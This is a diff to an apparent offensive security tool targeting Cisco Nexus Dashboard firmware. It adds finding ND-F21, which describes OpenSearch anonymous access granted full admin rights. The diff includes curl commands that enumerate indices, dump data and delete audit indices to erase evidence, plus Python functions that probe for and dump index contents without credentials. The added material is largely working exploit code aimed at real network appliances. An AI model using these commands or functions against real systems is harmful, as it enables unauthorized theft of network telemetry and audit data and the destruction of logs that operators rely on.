@@ -27,7 +27,7 @@ Container stack (atomix.yaml, 20 core + 200+ app containers):
   apps/cisco-ndfc: 32 NDFC (fabric controller) services
   apps/cisco-nir: 60+ NIR telemetry analysis services
 
-Findings: ND-F01 (CRITICAL) through ND-F20 (HIGH)
+Findings: ND-F01 (CRITICAL) through ND-F21 (CRITICAL)
 """
 
 import socket
@@ -681,6 +681,49 @@ FINDINGS = {
         ],
         "chain": "ND-F20 bucket enum -> ND-F19 cred derivation -> full MinIO exfil",
     },
+    "ND-F21": {
+        "title": "OpenSearch Anonymous Auth Mapped to all_access — Unauthenticated Full Cluster Admin",
+        "severity": "CRITICAL",
+        "component": "infra/opensearch container (config.yml, roles_mapping.yml)",
+        "description": (
+            "The OpenSearch security plugin config.yml shipped in ND firmware sets "
+            "'anonymous_auth_enabled: true'. The roles_mapping.yml maps "
+            "'opendistro_security_anonymous_backendrole' (the anonymous user's backend role) "
+            "to 'all_access' (the OpenSearch superuser role). "
+            "Result: any unauthenticated HTTP request to OpenSearch port 9200 is processed "
+            "with full cluster admin privileges. No credentials required. "
+            "This is confirmed by security_provision.sh which runs curl against OpenSearch "
+            "_cluster/settings with no authentication headers — the script works because "
+            "anonymous auth grants all_access. "
+            "ND uses OpenSearch as the backend for: NIR telemetry/anomaly analysis, "
+            "audit logs, event correlation, NDFC fabric state data. Full read access "
+            "exposes network topology, traffic patterns, and security audit trails. "
+            "Full write access allows index deletion, data tampering, and log erasure "
+            "to cover attacker activity. "
+            "The security config is pushed cluster-wide by security_provision.sh via "
+            "securityadmin.sh using TLS admin cert at "
+            "/opt/opensearch/config/certs/admin/admin-key.pem — this second path "
+            "(cert forgery via ND-F03/ND-F04 etcd bypass) also yields full securityadmin access."
+        ),
+        "port": 9200,
+        "protocol": "HTTPS",
+        "anonymous_auth": True,
+        "anonymous_role": "all_access",
+        "config_file": "infra/opensearch/securityconfig/config.yml",
+        "roles_mapping": "infra/opensearch/securityconfig/roles_mapping.yml",
+        "data_at_risk": [
+            "NIR telemetry and network anomaly analysis data",
+            "ND audit logs (user actions, API calls, auth events)",
+            "NDFC fabric event correlation data",
+            "Network topology and traffic pattern time series",
+        ],
+        "exploit": (
+            "curl -k https://<opensearch>:9200/_cat/indices?v  # no auth, returns all indices\n"
+            "curl -k https://<opensearch>:9200/<index>/_search?pretty  # dump any index\n"
+            "curl -k -XDELETE https://<opensearch>:9200/<audit_index>  # erase audit trail"
+        ),
+        "chain": "ND-F21 no-auth OpenSearch -> dump ND telemetry/audit -> log erasure (evidence destruction)",
+    },
 }
 
 
@@ -1083,6 +1126,64 @@ def probe_minio_api(host: str, port: int = 9000, access_key: str = "minio-nd-acc
         return {"http_error": e.code, "access_key": access_key, "finding": "ND-F19"}
     except Exception as e:
         return {"error": str(e), "finding": "ND-F19"}
+
+
+def probe_opensearch_anon(host: str, port: int = 9200) -> dict:
+    """
+    Probe OpenSearch with no credentials — ND-F21: anonymous_auth_enabled + all_access mapping.
+    Returns index list if anonymous auth grants all_access (as configured in shipped firmware).
+    """
+    url = f"https://{host}:{port}/_cat/indices?format=json"
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    try:
+        req = urllib.request.Request(url)
+        with urllib.request.urlopen(req, context=ctx, timeout=5) as resp:
+            indices = json.loads(resp.read().decode())
+            return {
+                "status": resp.status,
+                "authenticated": False,
+                "index_count": len(indices),
+                "indices": [i.get("index", "?") for i in indices[:20]],
+                "finding": "ND-F21",
+            }
+    except urllib.request.HTTPError as e:
+        return {"http_error": e.code, "authenticated_required": e.code == 401, "finding": "ND-F21"}
+    except Exception as e:
+        return {"error": str(e), "finding": "ND-F21"}
+
+
+def dump_opensearch_index(host: str, index: str, port: int = 9200, size: int = 10) -> dict:
+    """
+    Dump documents from an OpenSearch index without credentials.
+    ND-F21: anonymous all_access permits unrestricted read on all indices.
+    Target indices: audit logs, NIR telemetry, NDFC fabric events.
+    """
+    url = f"https://{host}:{port}/{index}/_search?size={size}"
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    try:
+        req = urllib.request.Request(
+            url,
+            data=b'{"query":{"match_all":{}}}',
+            headers={"Content-Type": "application/json"},
+            method="POST",
+        )
+        with urllib.request.urlopen(req, context=ctx, timeout=10) as resp:
+            body = json.loads(resp.read().decode())
+            hits = body.get("hits", {}).get("hits", [])
+            return {
+                "status": resp.status,
+                "index": index,
+                "total": body.get("hits", {}).get("total", {}).get("value", 0),
+                "sample_count": len(hits),
+                "sample": [h.get("_source", {}) for h in hits[:3]],
+                "finding": "ND-F21",
+            }
+    except Exception as e:
+        return {"error": str(e), "finding": "ND-F21"}
 
 
 def check_build_annotation_leakage(squashfs_path: str, service: str = "kms") -> dict:
